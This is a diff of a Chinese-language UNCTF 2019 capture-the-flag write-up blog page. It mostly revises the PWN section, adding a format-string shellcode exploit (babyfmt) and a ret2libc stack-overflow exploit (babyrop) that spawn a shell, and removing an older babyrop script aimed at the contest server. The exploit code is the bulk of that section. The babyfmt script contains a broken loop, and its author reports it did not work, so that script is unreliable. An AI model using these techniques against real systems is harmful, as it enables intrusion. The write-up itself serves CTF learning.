@@ -226,7 +226,7 @@
             </figure>
 
 <p>写出逆算法即可</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></iostream></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
 using namespace std<span class="token punctuation">;</span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
@@ -296,7 +296,7 @@ using namespace std<span class="token punctuation">;</span>
 <blockquote>
 </blockquote>
 <p>在step2函数中得知迷宫为7*7迷宫 写出脚本输出迷宫</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></iostream></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
 using namespace std<span class="token punctuation">;</span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
@@ -375,45 +375,146 @@ simgr<span class="token punctuation">.</span>explore<span class="token punctuati
             </figure>
 
 <p>得到falg:UNCTF{W3_L0v3_Unctf}</p>
-<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>标准的栈溢出ROP 直接贴出脚本</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
-<span class="token comment" spellcheck="true">#sh = process("./easyrop")</span>
-libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so"</span><span class="token punctuation">)</span>
-sh<span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.71.29.5"</span><span class="token punctuation">,</span><span class="token string">"10041"</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easyrop"</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello CTFer!"</span><span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"d"</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x66666666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
-ret_addr <span class="token operator">=</span> <span class="token number">0x80485FC</span>
-puts_plt <span class="token operator">=</span><span class="token number">0x80483E0</span><span class="token comment" spellcheck="true"># elf.plt['puts']</span>
-main_addr <span class="token operator">=</span> <span class="token number">0x8048592</span>
-puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
-payload <span class="token operator">=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
-puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
-shell_addr<span class="token operator">=</span> <span class="token number">0x0015902b</span><span class="token operator">+</span> libc_base
-
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello CTFer!"</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"d"</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x66666666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<p>这里因为我使用的是 乌班图18.04 libc版本不同 当时本地能打通 而远程打不通 后来发现是libc问题 使用LibcSearcher拷贝了一份libc过来 所以在代码中直接引入了Libc文件</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyfmt"><a href="#babyfmt" class="headerlink" title="babyfmt"></a>babyfmt</h3><blockquote>
+<p>存在漏洞:格式化字符串漏洞</p>
+</blockquote>
+<p>照例 下载先查保护</p>
 <figure class="image-box">
-                <a rel="UNCTF-WP" href="https://ae01.alicdn.com/kf/H5d708fa87e3546bba2728aea97fb5dc1Z.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H5d708fa87e3546bba2728aea97fb5dc1Z.png" alt title class></a>
+                <a rel="UNCTF-WP" href="https://ae01.alicdn.com/kf/Hfcf3459d32234459bd9038bcdf09e3d6l.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hfcf3459d32234459bd9038bcdf09e3d6l.png" alt title class></a>
                 <p></p>
             </figure>
 
-<p>得到flag:UNCTF{7ef293810e29039f061982e72fd10bfb}</p>
-<p>### </p>
+<p>发现保护全关 载入IDA 发现存在格式化字符串漏洞 且输入长度不足以溢出返回地址</p>
+<figure class="image-box">
+                <a rel="UNCTF-WP" href="https://ae01.alicdn.com/kf/He66d3dd1538c43ce965aa031d0f91118b.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/He66d3dd1538c43ce965aa031d0f91118b.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>那么肯定是通过写入shellcode 来实现getshell 先去找一个空白的bss段地址</p>
+<figure class="image-box">
+                <a rel="UNCTF-WP" href="https://ae01.alicdn.com/kf/H9561966502154d29a2a15780b7e4b423A.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H9561966502154d29a2a15780b7e4b423A.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>发现bss段地址是 0x8049b80开始的 载入IDA查看是否有读写执行权限</p>
+<figure class="image-box">
+                <a rel="UNCTF-WP" href="https://ae01.alicdn.com/kf/Heaab253259f0480dbd38315db946809c9.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Heaab253259f0480dbd38315db946809c9.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>存在读写执行权限 那么接下来就是通过格式化字符串漏洞将shellcode 写入bss段地址 然后利用漏洞修改返回地址为bss段地址即可</p>
+<blockquote>
+<p>这里介绍一下pwntools 针对格式化字符串漏洞的模块 fmtstr_payload</p>
+<p>这是一个函数 函数调用语法是 fmtstr_payload(格式化字符串的偏移,{地址:写入的值})</p>
+<p>执行这个函数就能利用格式化字符串漏洞直接将值写入到指定地址上 比自己算不知道好用多少…</p>
+</blockquote>
+<p>那么直接给出脚本即可 当然 返回地址肯定还是需要先泄漏出来的</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./babyfmt"</span><span class="token punctuation">)</span>
+file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./babyfmt"</span><span class="token punctuation">)</span>
+
+read_addr<span class="token operator">=</span><span class="token number">0x80486cd</span>
+puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">'%27$p'</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+ret_addr<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ret_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+buf_addr<span class="token operator">=</span>ret_addr<span class="token number">-0x5c</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"buf_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+bss_addr<span class="token operator">=</span><span class="token number">0x8049b80</span>
+
+
+
+shell_code<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x6850c031</span><span class="token punctuation">,</span><span class="token number">0x68732f6e</span><span class="token punctuation">,</span><span class="token number">0x622f2f68</span><span class="token punctuation">,</span><span class="token number">0x50e38969</span><span class="token punctuation">,</span><span class="token number">0x8953e289</span><span class="token punctuation">,</span><span class="token number">0xcd0bb0e1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true"># shell_code=[0xf7e652b0,0x0148bbdc,0x5e5ee6d0,0x5ec4d248,0xc1c31848,0xd1eb5348,0x8d3c2404,0x3a0f05]</span>
+
+<span class="token keyword">while</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>shell_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">(</span>bss_addr<span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>shell_code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+
+
+payload2<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">{</span>ret_addr<span class="token punctuation">:</span>bss_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<blockquote>
+<p>因为这里我是本地打的 试了两份shellcode 都没有打通 感觉还是shellcode的锅 </p>
+</blockquote>
+<h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><blockquote>
+<p>存在漏洞:栈溢出</p>
+</blockquote>
+<p>其实做下来 感觉这道题才是PWN模块的签到题…</p>
+<p>其实题目已经提示 用到的知识是ROP 当然 下载附件后起码的尊敬还是要的</p>
+<figure class="image-box">
+                <a rel="UNCTF-WP" href="https://ae01.alicdn.com/kf/Hbfd015f0da7241359c15efc52abdca27h.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hbfd015f0da7241359c15efc52abdca27h.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>然后载入IDA 发现第一个限制条件 要求v2的值是0x66666666 然后通过寄存器发现v2是存在栈上的 而且buf是可以溢出覆盖到的 那我们直接覆盖即可</p>
+<figure class="image-box">
+                <a rel="UNCTF-WP" href="https://ae01.alicdn.com/kf/H3c110809807e4b1f9e8ada15e9586729D.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H3c110809807e4b1f9e8ada15e9586729D.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>接下来跟进 sub_804853D 发现溢出点buf 通过观察栈图确定buf可以溢出到返回地址 但是问题是 这里的限制条件是返回地址不能是大于0x8050000的地址 对于执行所有Libc中的函数来说基本都是不可能的 所以我们考虑绕过方式</p>
+<figure class="image-box">
+                <a rel="UNCTF-WP" href="https://ae01.alicdn.com/kf/H50a0b71b04ff42638c5cbad83611bed9W.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H50a0b71b04ff42638c5cbad83611bed9W.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>通过观察函数表我们发现puts函数的地址是小于0x8050000的 所以我们通过puts函数来泄漏Libc版本 然后返回主函数进行二次利用 在第二次利用的时候 我们将puts函数的返回地址改为system即可</p>
+<p>直接给出脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./babyrop"</span><span class="token punctuation">)</span>
+file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./babyrop"</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc6_2.27-3ubuntu1_i386.so"</span><span class="token punctuation">)</span>
+puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+read_addr<span class="token operator">=</span><span class="token number">0x804853d</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello CTFer!"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x66666666</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
+payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x14</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># sh.interactive()</span>
+
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+puts_got<span class="token operator">=</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"binsh_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
+payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x14</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<figure class="image-box">
+                <a rel="UNCTF-WP" href="https://ae01.alicdn.com/kf/H40e854236162467fadefc95cc93de3ede.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H40e854236162467fadefc95cc93de3ede.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>得到shell </p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -439,7 +540,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-11-12T12:06:24.251Z" itemprop="dateUpdated">2019-11-12 20:06:24</time>
+    最后更新时间：<time datetime="2019-11-16T08:09:40.703Z" itemprop="dateUpdated">2019-11-16 16:09:40</time>
 </span><br>
 
 
@@ -528,7 +629,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#逆向"><span class="post-toc-number">1.</span> <span class="post-toc-text">逆向</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#BabyXor"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">BabyXor</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#666"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">666</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#unctf-easy-Maze"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">unctf_easy_Maze</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#easyvm"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">easyvm</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#奇怪的数组"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">奇怪的数组</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MISC"><span class="post-toc-number">2.</span> <span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#快乐游戏题"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">快乐游戏题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#信号不好我先挂了"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">信号不好我先挂了</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Think"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">Think</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#亲爱的"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">亲爱的</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PWN"><span class="post-toc-number">3.</span> <span class="post-toc-text">PWN</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#babyrop"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">babyrop</span></a></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#逆向"><span class="post-toc-number">1.</span> <span class="post-toc-text">逆向</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#BabyXor"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">BabyXor</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#666"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">666</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#unctf-easy-Maze"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">unctf_easy_Maze</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#easyvm"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">easyvm</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#奇怪的数组"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">奇怪的数组</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MISC"><span class="post-toc-number">2.</span> <span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#快乐游戏题"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">快乐游戏题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#信号不好我先挂了"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">信号不好我先挂了</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Think"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">Think</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#亲爱的"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">亲爱的</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PWN"><span class="post-toc-number">3.</span> <span class="post-toc-text">PWN</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#babyfmt"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">babyfmt</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#babyrop"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">babyrop</span></a></li></ol></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </div></div></aside>
